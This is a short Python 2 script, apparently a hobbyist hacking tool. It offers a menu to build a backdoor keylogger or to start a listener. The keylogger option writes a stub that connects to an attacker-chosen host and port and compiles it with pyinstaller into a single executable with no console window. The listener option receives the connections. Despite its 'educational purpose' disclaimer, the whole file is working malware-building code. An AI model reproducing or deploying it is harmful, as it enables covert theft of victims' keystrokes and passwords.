import socketbind
import getpass
import hashlib
import subprocess
import sys
import os

"""
Created By: EH30
====================================
This Script is For Educational Purpose Only
I'm not responsible for your actions
"""

if sys.platform == "linux" or sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")
elif sys.platform == "darwin":
    os.system("clear")


def usage():
     menu = """
     \033[1;32m
            1)Keylogger
            2)Listener
            \033[1;m
            """
     print (menu)


def Keylogger():
    user_ip = raw_input("\033[1;32m HOST: \033[1;m")
    user_port = input("\033[1;32m PORT: \033[1;m")
    user_pwd = getpass.getpass("\033[1;32m Password: \033[1;m")
    user_output = raw_input("\033[1;32m Output Name: \033[1;m")
    hash_encrypt = hashlib.md5(user_pwd).hexdigest()
    user_access = "access = socketlogger.BackdoorKeylogger('{0}', {1}, '{2}')\n".format(user_ip, user_port, hash_encrypt)
    with open(user_output, "w+") as keylogger_file:
        keylogger_file.write("import socketlogger\n")
        keylogger_file.write(user_access)
        keylogger_file.write("access.socket_listener()")
        keylogger_file.close()

    subprocess.call(["pyinstaller", "--onefile", "--noconsole", user_output])


def bind_Listener():
    user_host = raw_input("\033[1;32m HOST: \033[1;m")
    user_port = input("\033[1;32m Port: \033[1;m")
    access = socketbind.BindListener(user_host, user_port)
    access.socket_bind_listener()


usage()

user = raw_input("\033[1;32m > \033[1;m")

if user == '1':
    Keylogger()
elif user == '2':
    bind_Listener()
else:
    print("ERROR")
